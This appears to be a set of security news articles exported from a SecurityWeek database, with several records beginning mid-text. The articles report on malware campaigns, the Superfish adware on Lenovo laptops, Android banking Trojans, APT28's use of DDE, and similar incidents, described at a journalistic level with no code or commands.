trusted sources, and be wary of anything claiming to offer up ‘exclusive footage’ on social media.”  Malware and other threats Bianca Dima, e-threat analyst at Bitdefender, pointed out that social media scams can be used to lure users to even more dangerous sites, not just fake surveys. \"We advise users to be cautious when clicking on videos pretending to show exclusive footage of the missile fired at the Malaysian Airlines flight MH17 or any other related images spreading on social networks such as Twitter and Facebook,\" Dima told SecurityWeek. \"These are all empty promises designed to steal their personal data through bogus surveys, and possibly trick them into downloading malware disguised as plug-ins or add-ons.\"  A perfect example of such an add-on was identified and analyzed by Kaspersky Lab expert Fabio Assolini.  “I analyzed a malicious Chrome extension distributed in the attack using the MH17 incident as a bait. The extension captures passwords of Facebook, Dropbox and display adds in sites such as Youtube. It also offers the possibility to download the video watched, but it's redirecting to sites full of advertisement. It's more like an adware, needing a lot of installations to generate volume of traffic and some hits to gain money on sponsored links programs,\" Assolini said. \"This is in fact an interesting move from Brazilian bad guys - they are going to a grayware area, investing their efforts to distribute adware/spyware, not only Trojan bankers.” The CSIS Security Group in Denmark has identified Facebook likejacking campaigns that rely on bogus  MH17 videos. Peter Kruse, a partner and e-crime specialist at CSIS, said they spotted the first campaign on Friday, but several others followed. \"They are written in English and target everyone who could be lured to click the link and then 'like it'. The webpages try to trick the user into installing a fake Flash Player plugin which installs a BHO [Browser Helper Object] in the browser. This hijacks traffic and introduces popups,\" Kruse told SecurityWeek via email.  The Twitter spam run analyzed by Trend Micro also involved links pointing to some malicious domains associated with IP addresses that have been connected to pieces of malware such as Zeus and Sality. The security firm believes that cybercriminals could launch attacks that may lead to personal information theft and system infection. Many of the bogus crash videos analyzed by BullGuard lead not only to malicous websites, but also to ones designed to trick users into downloading malware disguised as various pieces of software. Some of these sites replicate legitimate services like Facebook, YouTube, and CNN.com. " }

The flaw, reported to Google by researchers at Palo Alto Networks, enables malicious actors to launch overlay attacks by abusing Android’s Toast feature, which allows applications to display messages and notifications on top of other apps. The feature is named Toast because the notifications pop up on the screen just like toast. Overlay attacks are commonly used by Android malware for phishing attacks, but using Toast provides some advantages, including the fact that it does not require the same types of permissions as other windows, and it allows an app to display a window that covers the device’s entire screen. The vulnerability, tracked as CVE-2017-0752 and classified as high risk, was patched by Google in September with its monthly Android security updates. Toast overlay attacks don’t work against devices running Android 8.0 Oreo. On Thursday, Trend Micro researchers reported seeing the first piece of malware leveraging the Toast overlay exploit. The threat, detected by the company as TOASTAMIGO, was disguised as apps named Smart AppLocker that had been available on Google Play, from where they were downloaded hundreds of thousands of times. The applications have since been removed from Google Play. The malicious apps claim to secure devices with a PIN code. Once installed, they request Accessibility permissions and inform the user that they need to scan the phone for unprotected apps. The Toast exploit is used to display a progress screen for the “scan,” but in the background the malware executes commands from the attackers and installs a second piece of malware named by Trend Micro AMIGOCLICKER. In addition to downloading other malware, TOASTAMIGO can terminate mobile security apps and perform other actions that prevent it from being removed. AMIGOCLICKER has self-preservation capabilities as well, but it can also collect Google accounts, click on buttons in system dialogs, click on Facebook ads, and give itself a five-star rating on Google Play. “The miscellany of the malware’s malicious functionalities, combined with a relatively unique attack vector, makes them credible threats. In fact, the aforementioned functionalities can actually be modified for further cyberattacks,” Trend Micro researchers said in a blog post. “Since TOASTAMIGO and AMIGOCLICKER can misuse Android’s Accessibility feature to virtually do anything, this malware can update itself when getting the remote server’s commands.” " }

The Safe Browsing service is designed to warn users when they are about to access a suspicious website or download malicious software. Now, Chrome users will also be alerted before they visit deceptive sites that encourage them to download unwanted software, the company said in a blog post.  Google has put significant effort into designing security warnings. When Chrome 37 was launched, the company introduced a new SSL warning that improved adherence rates by nearly 30%, Google researchers revealed in a recent study. As far as search improvements are concerned, the company has integrated signals that identify deceptive websites in order to reduce the chances of users visiting them via search results. Google has also started disabling ads that point to websites serving unwanted software. It’s not uncommon for cybercrooks to leverage ads in an effort to lure users to their shady websites and one of their favorite tactics is malicious advertising (malvertising). A malvertising campaign first spotted in December abused Google AdSense to redirect users to bogus sites. Google advises owners to register their websites with Google Webmaster Tools, which alerts them in case anything suspicious is identified on their sites. Last month, the search giant released the beta version of the Google Cloud Security Scanner, a tool designed to help Google App Engine developers identify cross-site scripting (XSS) and mixed content vulnerabilities. The tool can prove handy for developers because it’s easy to set up and use, and it’s capable of scanning rich, JavaScript-heavy Web applications. " }

Laziok, a reconnaissance tool and information stealer, was first spotted last year when a threat group leveraged the malware in a sophisticated multi-stage attack campaign targeting energy companies in the Middle East. Attackers exploited an old Windows vulnerability tracked as CVE-2012-0158 to drop the Trojan onto users’ systems. According to FireEye, attackers found a way to bypass Google’s security checks and uploaded the malicious payload to Google Docs. The malware was uploaded in March and remained there until Google was notified by the security firm. “Users are not usually able to download malicious content from Google Docs because Google actively scans and blocks malicious content. The fact that this sample was available and downloadable on Google Docs suggests that the malware evaded Google’s security checks,” researchers said. “Following our notification, Google promptly removed the malicious file and it can no longer be fetched.” The operation observed by researchers started on the website of a Poland-based hosting service. The attack was initiated by loading obfuscated JavaScript code designed to exploit a Windows vulnerability tracked as CVE-2014-6332 and dubbed “Unicorn.” When users accessed the attack page from Internet Explorer, the malicious script exploited CVE-2014-6332 via VBScript to bypass protections and enable attackers to use an exploitation method known as “Godmode,” which allows code written in VBScript to break the browser sandbox. The malicious script then leveraged PowerShell, which has been increasingly abused by cybercriminals, to download the actual malware from Google Docs and execute it. “PowerShell is also useful for bypassing anti-virus software because it is able to inject payloads directly in memory,” FireEye researchers explained in a blog post. “It seems the technique is still popular among campaigns involving infostealers, and this one was able to evade Google Docs security checks.” Once it infects a device, Trojan.Laziok collects information about the system, including a list of installed antiviruses.

A free beta version of the endpoint security product is available for testing. Terra Privacy was founded by Michael Wood, the cryptographer who designed the REDOC II encryption system. The company’s latest product, Hacker Deterrent Pro, uses dynamically-generated whitelists to ensure that web browsers and other applications only communicate with the servers they are supposed to. Hacker Deterrent Pro has three main features: Two-Factor Browsing, App Firewall, and DNS Shield. Two-Factor Browsing ensures that the browser only communicates with trusted domains. To achieve this, the product creates a real-time transient whitelist that contains only the names of webpages opened by the user and the names of other sites from which content is pulled, while any other connection attempt is blocked. This prevents browser-based threats from communicating with their command and control (C&C) servers, and it can also be used to block commercial trackers. Traditional whitelisting can be impractical as users have to manually add each website. Hacker Deterrent aims to address this problem by creating transient whitelists that are empty when the web browser is first opened. Each time the user visits a website, that site is automatically added to the whitelist and removed from the whitelist when the page is closed. This method can also be efficient against sophisticated phishing attacks as Hacker Deterrent Pro will block unauthorized domains even if they look legitimate. The vendor demonstrated its product’s capabilities by showing how it could block phishing sites that use a recently disclosed Unicode-based technique. According to the company, the solution can also block non-browser Trojans that inject themselves into running processes by preventing them from communicating with domains other than ones belonging to the hijacked app’s developer. For example, the explorer.exe process, which is often targeted by malware, should only be allowed to communicate with Microsoft servers. The app firewall initially blocks all applications from accessing the Web, and provides information about the app and the host it wants to connect to, allowing users to determine if the connection should be allowed. The product’s DNS Shield allows users to select DNS servers based on their personal preferences, blocking ISPs from adding their own list of DNS servers. For instance, users can choose DNS servers that reject connections to IPs that are known to host malware. The beta version of Hacker Deterrent Pro can be tested for free. The commercial version of the product, expected to become available in mid-July, will cost $39.99 per year per endpoint. The solution works on Windows PCs using the Chrome and Firefox web browser.

As it turns out, the evil twins of Googlebots are often used these days as the starting point for distributed denial-of-service (DDoS) attacks. According to new research from Incapsula taken from its inspection of more than 50 million fake Googlebot visits, 34.3 percent of all identified imposters were explicitly malicious - with 23.5 percent of these bots being used for Layer 7 DDoS attacks. \"Using Googlebot presents target website operators with a harsh dilemma - to block all Googlebots and be dropped from Google or to keep allowing Googlebots in and risk prolonged downtime,\" Igal Zeifman, product evangelist at Incapsula, told SecurityWeek. \"With Layer 7 attacks that can go for weeks and months at a time, both solutions are equally devastating.\" On average, a website will be visited by Googlebots 187 times per day, Incapsula estimates. For every 24 of those legitimate visits however, the site will also get a visit from a phony Googlebot. Many of the fake Googlebots examined by Incapsula were used for market intelligence (65.7 percent), while the rest were used for either DDoS, scraping (5.3 percent), spamming (3.8 percent) or hacking (1.7 percent). In a blog post, Zeifman noted that fake Googlebots originate from botnets, most of which are inside the U.S., China, Turkey and India. The U.S. is the biggest country of origin for fake Googlebot visits, coming in at roughly 25 percent. \"One would assume that having a full list of IPs from Google could help, as it can be used by regular website owners to filter fake Googlebot traffic,\" Zeifman told SecurityWeek. \"However, realistically speaking, it's hard to imagine most users keeping up with that list and updating their security rules as it expands. Realistically speaking, users just need to be aware of this threat and counter it with a security service that can accurately and transparently filter malicious bot traffic - Googlebot or otherwise.\" The best option, he said, is granular visit-by-visit processing, to verify the identity of every single visitor. \"This requires a lot of processing power, because you need to address each incoming request,\" he said. \"Very few possess that technology and fewer still have the CPU power to process hundreds of thousands of requests per second.\" More on the Incapsula research can be read here.  " }

According to endpoint security company SentinelOne, the method used by these threat groups enables them to inject the RAT payload into memory and avoid detection by antiviruses and even modern technologies that only focus on file-based threats. In the attacks analyzed by researchers, some files had been written to the disk, but the malicious payload never touched the disk in an unencrypted state. Joseph Landry, senior security researcher at SentinelOne, told SecurityWeek that nation-state actors from multiple Asian countries have used this technique. The expert said that while these attacks appear to be mostly contained within Asia, there is a possibility that the method is used in other parts of the world against both governments and enterprises. SentinelOne has detailed an attack involving a known RAT named NanoCore (aka Nancrat), which allows attackers to spy on victims. However, experts pointed out that the technique can be used to deliver any other RAT. When first executed on a system, the malware creates two binaries in the %APPDATA% folder and executes them. A registry key pointing to one of these files is created for persistence. An encrypted DLL responsible for unpacking and injecting the RAT is decrypted and copied into memory. The settings for this DLL and the NanoCore executable itself are encrypted and stored across multiple PNG image files as pixel data.  Once all components are decrypted, the NanoCore payload is injected into a new process using various Win32 API and system calls. A detailed description of the infection method is available on SentinelOne’s blog. Fileless infection techniques have been observed in many types of attacks, including ones involving exploit kits, ransomware, and click-fraud malware. " }

{ "_id" : { "$oid" : "5b27c4cd6cefc41c844ab3df" }, "Category" : "Malware", "Title" : "WikiLeaks Says CIA Impersonated Kaspersky Lab", "Address" : "https://www.securityweek.com/wikileaks-says-cia-impersonated-kaspersky-lab", "Date" : "November 09, 2017", "Article" : "WikiLeaks has resumed its CIA leaks and it has now started publishing source code and other files associated with tools allegedly developed by the intelligence agency. In March, WikiLeaks began publishing documentation files describing what appeared to be CIA hacking tools as part of a leak dubbed Vault 7. Roughly two dozen tools and projects were disclosed over the course of several months. Now, after a two-month break, WikiLeaks announced a new round of leaks dubbed Vault 8, which provides source code and analysis for CIA tools. The organization pointed out that, similar to Vault 7, Vault 8 will not expose any zero-day or other vulnerabilities that could be used for malicious purposes. “This publication will enable investigative journalists, forensic experts and the general public to better identify and understand covert CIA infrastructure components,” WikiLeaks said. “Source code published in this series contains software designed to run on servers controlled by the CIA.” The first Vault 8 leak covers Hive, a project whose documentation was published by WikiLeaks in mid-April. The organization has now released source code and development logs for Hive. Hive has been described as a tool designed to help malware communicate with a remote server without raising suspicion. “Using Hive even if an implant is discovered on a target computer, attributing it to the CIA is difficult by just looking at the communication of the malware with other servers on the internet,” WikiLeaks said. “Hive provides a covert communications platform for a whole range of CIA malware to send exfiltrated information to CIA servers and to receive new instructions from operators at the CIA.” Hive provides a communication channel between a piece of malware and what WikiLeaks describes as “cover domains.” These domains are boring-looking and they deliver harmless content when accessed. However, malware implants communicating with these domains authenticate themselves and the traffic they generate is directed to a gateway called Honeycomb, which sends the data to its final destination. Implants authenticate themselves using digital certificates that impersonate existing entities. One fake certificate is for Russia-based security firm Kaspersky Lab and it pretends to have been issued by South African certificate authority Thawte. According to WikiLeaks, its analysis revealed that by using these fake certificates, the CIA made it look like data was being exfiltrated by one of the impersonated entities – in this case Kaspersky Lab. “We have investigated the claims made in the Vault 8 report published on November 9 and can confirm the certificates in our name are fake,” Kaspersky Lab told SecurityWeek. “Our private keys, services and customers are all safe and unaffected.” The news that the CIA may have impersonated Kaspersky Lab in its operations has led some to believe that the U.S. may have actually used such tools to falsely pin cyberattacks on Russia. The U.S. government has banned the use of Kaspersky products due to the company’s alleged ties to Russian intelligence. A recent report also claimed that Kaspersky products had been used on the computer of an NSA contractor from which Russian hackers stole sensitive files. Kaspersky has denied the allegations and announced a new transparency initiative in an effort to clear its name. " }

Now, the company has apologized to customers and provided them with instructions on how to remove the application. Lenovo preloaded the WindowShopper browser add-on from Superfish thinking that customers would enjoy its features. However, many users were annoyed by it and started complaining on the Chinese manufacturer’s forums. After security researchers analyzed the software, they realized that it poses serious risks. The adware injects ads into web pages by using a local proxy and a self-signed root certificate. Superfish actually replaces legitimate certificates with its own, making connections that should be secure untrusted.  Even more worrying is the fact that researchers have managed to extract the certificate’s private key. The private key can be used to sign potentially malicious websites and software that would be trusted on affected Lenovo notebooks. Industry professionals pointed out that Lenovo should have known better not to install such software on its computers. Experts also noted that while this is a common practice, they hope that manufacturers will learn from the Superfish incident. And the feedback begins… Martijn Grooten, Editor at Virus Bulletin: “Like most people working in security, I'm not very keen on the idea of ads in general and running third-party code on your computer or inside your browser in particular. But then, I accept that ads are part of the ecosystem and that pre-installing software that, as it is euphemistically called, \"enhances user experience\" makes laptops significantly cheaper.  Now injecting ads into a browser is bad enough, doing so by running an HTTPS proxy on the machine is a lot worse. HTTPS shouldn't be touched unless it is for a very good reason - inserting ads is never a good reason.  But what makes it still orders of magnitude worse than that, is that their proxy uses the same certificate on all affected (or, perhaps more accurate, infected) PCs. Hence anyone can obtain the private key of the certificate - which, as people have already showed, isn't rocket science - and use this to man-in-the-middle HTTPS traffic without the Lenovo user being aware.  The industry of bundled apps and programs is a complicated one and finding out what all the programs installed on the PCs you sell are up to might not be as easy as security researchers may suggest. But Lenovo should have been able to detect Superfish adding a SSL root certificate to the computer, as well as it running an HTTPS proxy on the local machine.” George Baker, Director of Professional Services at Foreground Security: \"This was clearly a questionable design decision by Lenovo. Trusted manufacturers should know that building in a 'man-in-the-middle' feature is just that... highly questionable, regardless of the claimed benefit. And weak protection on the Superfish software's own private key further undermines the system's root of trust. If the software is present and trusted by the operating system, a knowledgeable attacker can exploit it at will.  That said, it's good that it was caught early, after four months of production, and that Lenovo is taking some action. That should at least limit the number of users - and the amount of their private data - who are exposed.\" ThreatStream CTO Greg Martin: “The latest Superfish debacle highlights the current strategy for device manufacturers across the electronics ecosystem looking to get their slice of the billion-dollar advertising revenue market that has made Google and others so successful. Unfortunately, like the case with Lenovo and many others, users' privacy and security are compromised - often in secret - leaving them extremely vulnerable to malicious hackers who leverage the this type of tracking technology against them.  Unfortunately this won't be the last we see of this type of story, but hopefully the publicity from Superfish will be enough to warn other like-minded manufacturers to take a more transparent approach and offer their users opt-out capabilities on future products that include embedded ad-tracking tech. Because Superfish was developed and licensed to Lenovo, it will be interesting to find out which other manufacturers are leveraging the Superfish technology in their products.” Patrick Belcher, Director of Security Analytics, Invincea: \"The Lenovo and Superfish unwanted software debacle should serve as notice that there are dozens of ad companies that push spyware and toolbars, many of which exhibit rootkit-like properties and siphon off local user information to sell to advertising companies.  These programs are delivered like Trojan horses, bundled into innocuous applications with the sole intent of spying on and generating revenue at the expense of the user's privacy. The ad companies purchase this siphoned data to deliver targeted advertising, and sometimes, malvertising to specific groups of users of the Internet.\" Ian Amit, Vice President at ZeroFOX: \"The Lenovo laptops that shipped with \"Superfish\" adware capable of snooping through the user's encrypted web traffic are a very tangible threat to consumers and companies. People posting about their new Lenovo laptop on social media makes it easy for attackers to find them. Consequently, mapping those users' home, work, and local coffee shops enables attackers to confidently launch man-in-the-middle attacks by abusing how Superfish allows snooping of encrypted web traffic (i.e. online banking, shopping, email, VPNs, etc).  We recommend that companies ensure their threat intelligence provide contextual data on their exposure as related to this vulnerability (employees, partners, locations, etc).” Simon Crosby, CTO and co-founder of Bromium: “It is high time for PC OEMs to accept that adware and other junk software installed in consumer devices is precisely the opposite of what their customers want, and that delivering a secure, non-intrusive, high quality product is valued by consumers. The Microsoft Surface Pro 3 is perhaps the antidote to the foolish behavior of PC vendors. It delivers the best that Microsoft offers, with no hidden scams.” Grayson Milbourne, Webroot Security Intelligence Director: “Sadly this is common practice in the industry. Customers aren’t informed this type of software is installed, leaving many users wondering how they have an infection on their brand new laptop when an anti-virus program picks it up. Consequently, this breeds a level of mistrust between the offending company and its customer base. In this case, users have aired their frustrations over social media channels – and it’s completely distracting from the quality products Lenovo manufactures.  In the past couple weeks, Lenovo has been forced to expend valuable time and resources managing backlash from the security community and customers. Undoubtedly, this is hurting the company’s bottom line and opening the door for competitors to claim privacy superiority.  If there’s a silver lining, it’s that this story will be a wake-up call for consumers. Whether its unwanted adware from the manufacture or hackers using malicious apps, they need to take precautions to know who is watching them on their own device.” Steve Lowing, Director of Product Development at Promisec: \"Preinstalled software, such as adware like Superfish, must go through the same scrutiny as the shipping company (in this case Lenovo) would do for their own software in order to prevent these kinds of brand impacting missteps from happening. While it’s not exactly uncommon to see adware or promotional-ware software on new laptops these days, the times have changed where these once opt-in based services are not forced on us by default.  Coupling this tactic with poorly designed software that can carry out a “man-in-the-middle” attack on what is expected to be secured data is a potential lawsuit waiting to happen. Companies like Lenovo should know better than to pre-install this kind of software in the first place.\" Mark Parker, Senior Product Manager, iSheriff: \"The practice of pre-installing 3rd party software on PCs delivered to retail establishments, and direct shipped to business customers, presents a considerable risk. Given the choice, most consumers and businesses would choose not to have the 3rd party software installed. In the case of Lenovo and Superfish, we see an indication of exactly how dangerous that can be.  The man-in-the-middle certificate used made it such that every secure session was no longer private. In a day and age where corporate breaches are increasing, we should be seeking ways to limit our exposure, not pre-installing software that can create an attack vector.\" Chris Schweigert, Security Operations Director at EiQ Networks: \"The recent discovery of the Superfish application on Lenovo PC’s brings up the old best practices of installing a known, respectable copy of an operating system on your computer when you take it out of the box. Commercial off-the-shelf (COTS) applications have long been scrutinized by major enterprise environments and you simply cannot trust what you get from a manufacturer.  As a best practice, organizations should have a gold build install of all the authorized software for each new computer that comes in. You have to nuke the manufacturer installed applications and then re-install what you know to be trusted. Another advantage here is the ability to more easily identify changes to that baseline configuration on all your systems.\" Randy Abrams, Research Director at NSS Labs: \"It is disconcerting that virtually no anti-malware products were detecting Superfish, however the difference between malicious adware and acceptable adware is not 'black and white.' Not all behaviors are expected to be detected without a level of inspection that is not possible with the amount of malware being released daily. Vendors like Superfish employ teams of researchers to evade anti-malware products.  There are very likely many other adware products performing the exact same activities as Superfish. The primary motivation Superfish has is advertising revenue. This could have gone much worse for Lenovo if theft was the motivation for backdoors in third party software.  It is incumbent upon C-Level IT professionals to make sure there are well-defined processes and procedures for releasing third-party software on any medium. This must include tracking and auditing of third party vendors, monitoring their reputations and malware scanning with multiple products.  Coincidentally, the newly-formed Clean Software Alliance (CSA) will help in preventing this type of adware to go undetected. The CSA is a coalition of antimalware vendors, download bundlers and other members of the 'adware' ecosystem that are cooperating to set meaningful standards for 'adware.' Superfish’s conduct would preclude CSA approval.\" Muddu Sudhakar, Caspida CEO: \"U.S. computer manufacturers are getting a lot of push back from other countries for their hardware sales after scrutiny from incidents like those tied to the NSA and Snowden. Hardware vendors need to show beyond reasonable doubt that they are shipping high quality, highly secure products, eliminating backdoors in hardware and operating systems.  We need new third party certifications for hardware vendors who ship desktops/laptops or servers such as Lenovo, IBM, HP, and Apple. The third party certification should be robust and should be done independently of vendor companies and independently of government agencies.\" John Hultquist, Senior Manager, Cyber Espionage Threat Intelligence at iSIGHT Partners: “We have noticed a trend affecting the software supply chain. The places people go to download applications or updates have been compromised on several occasions recently by cyber espionage actors who trojanize the software with their own malware. Chinese and Russian operators have swapped out everything from SCADA software to computer games, targeting very specific users as well as some opportunistic victims.” John Pirc, Chief Strategy Officer and Co-founder of Bricata: “Based on the information surfacing about Superfish, administrators should inspect for where this application is installed and remove it. If you are using cloud based applications such as Microsoft Office 365 for Business or Google Apps for Work, enabling 2-step authentication offers additional protection in case your log-in credentials have been exposed. In the event someone is able to get your username and password they might try and log-in from another system; 2-step authentication would protect you from becoming further compromised.  This could also complicate matters for the Lenovo install base if they have a significant footprint within the U.S. government or federal contractors. My same recommendations for businesses apply in these sectors. However, I would strongly recommend that anyone in the USG and contractor community who uses a Lenovo PC and is involved with any sensitive projects should have their system checked for Superfish. Having the app installed may not mean they are compromised, but again, the main objective is reducing your risk.  Lenovo is a great company and it is unlikely they would knowingly place ‘malware’ on a system. Lenovo should have caught the Superfish issues earlier, via discussions in their user forums and I’m sure they are addressing the matter. Still, this does not discount the risk facing those who are at risk of a man-in-the-middle attack.” Greg Hoffer, senior director of engineering, Globalscape: “We put a lot of trust in technology, but this event is a reminder for everyone: take nothing for granted, and remain ever vigilant with the products you develop, integrate and purchase. There are ample industry standards available for security development and testing, independent security experts available to validate performance, and well-established protocols for production and operations. Assume nothing and put into action the old axiom, ‘Trust, but verify.’” " }

Authorities said they identified 20 suspects in Moscow and five other regions of Russia. They believe the group was led by a 30-year-old living in the city of Ivanovo. Group-IB, the Russian cybersecurity firm that assisted the government’s investigation, reported that 16 members of the group were detained in November 2016, while the last active member was apprehended in April. The group used an Android banking Trojan dubbed “Cron,” which researchers first spotted in March 2015, when cybercriminals had been distributing it disguised as Viber and Google Play apps. Roughly one year later, experts noticed that someone had offered to rent an Android banking Trojan dubbed “Cron Bot.” In an analysis of the mobile malware market, IBM X-Force researchers reported in April 2016 that Cron Bot had been leased for between $4,000 and $7,000, depending on the package. The cybercrime gang targeted by Russian authorities used spam SMS messages to deliver the Trojan to individuals in Russia. The messages informed recipients that their ads or photos had been posted on a website, and included links to a site that tricked users into downloading and installing the malware. The threat had been disguised as various apps, including Avito, Pornhub, Framaroot and Navitel. Once it infected a device, the Trojan allowed the cybercrooks to steal and hide SMS messages coming from banks, and send SMSs to specified numbers. Since many Russian banks allow their customers to conduct transactions via SMS, these features allowed the fraudsters to transfer money from the victims’ accounts into their own. According to Group-IB, the gang opened more than 6,000 bank accounts to which they transferred the stolen funds. Investigators said the Cron malware was used to steal an average of $100 (8,000 rubles) from 50-60 bank customers each day. The cybercriminals managed to infect more than one million smartphones and stole nearly $900,000 (50 million rubles). Following the success of their operation in Russia, the group decided to expand to other countries with the aid of a banking Trojan named Tiny.z, which they rented for $2,000 per month. Tiny.z uses overlay screens adapted to each targeted bank’s mobile application in order to trick victims into handing over personal and financial details that can be leveraged to steal money from their account. The Cron gang had been planning on hitting France first, and they developed web injections for several of the country’s banks, including Credit Agricole, Assurance Banque, Banque Populaire, BNP Paribas, Boursorama, Caisse d'Epargne, Societe Generale and LCL. However, law enforcement managed to disrupt their operations before they could launch attacks on French banks.

Dubbed Panda Banker, the threat was discovered in February by Fox IT and later analyzed in detail by experts at Proofpoint. According to Proofpoint, cybercriminals have used both spear-phishing emails and exploit kits to deliver the Trojan. In one spear-phishing campaign observed on March 10, attackers sent an email containing a malicious document to people working in mass media and manufacturing organizations. When recipients opened the document, Panda Banker was downloaded from a remote server. In a different spear-phishing campaign spotted on March 19, attackers targeted financial organizations. In this case, the malicious documents contained macros set up to download a loader called “Godzilla,” which in turn downloaded Panda Banker. Proofpoint found Panda Banker being delivered by three different exploit kits since March, including Angler, Nuclear and Neutrino. Researchers determined that cybercriminals used exploit kits to specifically target users in Australia and the United Kingdom. The webinjects used by the malware to steal private information from victims were also tailored for Australian and UK banks. Once it infects a system, Panda Banker contacts its command and control (C&C) server and sends it information about the infected device, including a list of installed antivirus, antispyware and firewall products. An analysis of Panda Banker revealed that the threat has many similarities to Zeus, the malware whose source code was leaked several years ago, leading to the development of many banking Trojans based on its code. For example, experts found that the mutexes, files, folders and registry keys created by Panda Banker are similar to ones created by Zeus. The cybercriminals behind Panda Banker have leveraged a technique called fast flux DNS, which involves the use of many different hosts as proxies, to protect their infrastructure. This method has been used in numerous malware operations, including Zeus attacks. Similar to other banking Trojans, such as Dridex, Panda Banker leverages an automated transfer system (ATS) to deliver webinjects to victims. “It's no surprise that a new banker - in this case, Panda Banker - has come on the scene, complete with a variety of information stealing mechanisms,” Proofpoint said in a blog post. “Like many modern banking Trojans, Panda Banker appears to have roots in Zeus with sophisticated means of establishing persistence and uses in both targeted and widespread attacks.” " }

After a close analysis, experts have determined that the application poses serious security risks. The culprit appears to be WindowShopper - Discover Visually, a browser add-on developed by visual search company Superfish. The application analyzes images displayed on Web pages and searches for similar or nearly identical items so that users can compare prices and find deals. The add-on basically injects third-party ads into Web pages. While many users consider it an annoying piece of adware that came with their brand new Lenovo laptop, security experts claim to have found some even more disturbing behavior that makes the application similar to malware. The add-on comes with a local proxy that enables man-in-the-middle (MitM) attacks. Even more concerning is that Superfish also installs a self-signed root certificate that enables MitM attacks against HTTPS connections. The application can be easily uninstalled, but the certificate is not removed in the process, experts said. Google security engineer Chris Palmer and TrueCrypt audit project co-founder Kenneth White posted screenshots of the certificate, which seems to be issued to Bank of America. Mozilla’s Firefox does not appear to be impacted by the MitM issue because the Web browser doesn’t use system certificates. Superfish could not immediately be reached for comment. Lenovo representatives said they have taken steps to address the issue and pointed out that the problematic application was not installed on all consumer PCs. “Lenovo removed Superfish from the preloads of new consumer systems in January 2015. At the same time Superfish disabled existing Lenovo machines in market from activating Superfish. Superfish was preloaded onto a select number of consumer models only. Lenovo is thoroughly investigating all and any new concerns raised regarding Superfish,” Lenovo told SecurityWeek. Mike Shaver, engineering director at Facebook, noted that some users reported in December that the Superfish app had also affected the use of smart card certificates. Fox-IT researcher Yonathan Klijnsma has managed to extract the private key for the Superfish certificate authority (CA) by reverse engineering the application and trying out possible passwords for the private key. The password is based on the name that Lenovo uses internally for Superfish, the expert said. “The certificate of this fake root CA is trusted on all sides which means with the private key from Superfish you can man-in-the-middle the client for all websites (unless some specific application uses certificate pinning on a root CA or intermediate f.e.),” Klijnsma told SecurityWeek. “Removing just the Lenovo software doesn't fix the issue, the root CA remains in the WIndows trust store. Because I now have managed to gain access to the private key I can MitM any website for Lenovo owners (would they have not fixed the issue or reinstalled the complete operating system of course),” he added. *Updated with additional information from Yonathan Klijnsma " }

Researchers at McAfee noticed the use of the DDE technique while analyzing a campaign that involved blank documents whose name referenced the recent terrorist attack in New York City. Researchers warned recently that DDE, a protocol designed for data exchanges between Windows applications, could be used by hackers as a substitute for macros in attacks involving malicious documents. Shortly after, security firms reported seeing attacks leveraging DDE to deliver malware, including Locky ransomware. Microsoft pointed out that DDE, which has been replaced with Object Linking and Embedding (OLE), is a legitimate feature. The company has yet to make any changes that would prevent attacks, but mitigations included in Windows do provide protection, and users are shown two warnings before the malicious content is executed. In the APT28 attacks spotted by McAfee, cyberspies used the document referencing the New York City attack to deliver a first-stage malware tracked as Seduploader. The malware, typically used by the threat actor as a reconnaissance tool, is downloaded from a remote server using PowerShell commands. Based on the analysis of the malware and command and control (C&C) domains used in the attack, researchers determined that the campaign involving DDE started on October 25. The attack using the New York City incident as lure appears to be part of a campaign that also involved documents referencing Saber Guardian, a multinational military exercise conducted by the U.S. Army in Eastern Europe in an effort to deter an invasion (by Russia) into NATO territory. Another recent APT28 attack leveraged a document describing CyCon U.S., a conference organized by the NATO Cooperative Cyber Defence Centre of Excellence (CCDCOE) in collaboration with the Army Cyber Institute at West Point. However, the CyCon attack relied on a malicious VBA script and it did not involve DDE. “Given the publicity the Cy Con U.S campaign received in the press, it is possible APT28 actors moved away from using the VBA script employed in past actions and chose to incorporate the DDE technique to bypass network defenses,” McAfee researchers said in a blog post. “[The] use of recent domestic events and a prominent US military exercise focused on deterring Russian aggression highlight APT28’s ability and interest in exploiting geopolitical events for their operations,” they added.

Andrew Kovalev, Konstantin Otrashkevich and Evgeny Sidorov, researchers at the Russian Internet company Yandex, have studied both the client side and the command and control (C&C) servers of the malware dubbed \"Mayhem.\"  Mayhem, a partial analysis which was published in May by the MalwareMustDie research group, is a multipurpose modular threat that has the functions of a traditional Windows bot, but which can operate even under restricted system privileges, the Russian experts said.  According to the researchers, the threat is distributed as a PHP script, which in mid-June was detected by only three of the antivirus engines on VirusTotal. After infecting a system, Mayhem begins communicating with its command and control (C&C) server via HTTP POST requests and responses.  A total of seven C&C commands have been identified. The malware can inform the server that it has been successfully loaded, it can request files, it can send data, and provide a report on its state. Additioanlly, the C&C can command the bot to run a new task, load a plugin, send data, and stop the current task, the research paper reveals.  Mayhem also relies on plugins, which are stored in a hidden file system just like the rest of the malware files, to perform a wide range of tasks. Researchers identified a total of eight plugins in the wild that can be used to find vulnerable websites, conduct brute-force attacks on various types of sites and accounts, and extract useful information from Web pages. In addition to these eight, there are a number of plugins that haven't been seen in the wild, including one designed to exploit the Heartbleed vulnerability.  By gaining access to two C&C servers, experts have determined that at least 1,400 servers have been infected with this threat, most of them being located in the United States, Russia, Germany and Canada. Kovalev, Otrashkevich and Sidorov believe that Mayhem is actually the continuation of Fort Disco, a major brute-force campaign detailed in the summer of 2013 by Arbor Networks.  Several pieces of malware designed to target Linux and Unix systems have been developed over the past period. In March, Symantec revealed the existence of a Linux worm capable of helping cybercriminals use compromised computers to mine for crypto-currencies. Earlier this month, Kaspersky Lab reported uncovering a Linux Trojan with DDoS functionality. The complete paper on Mayhem is available on Virus Bulletin.   " }

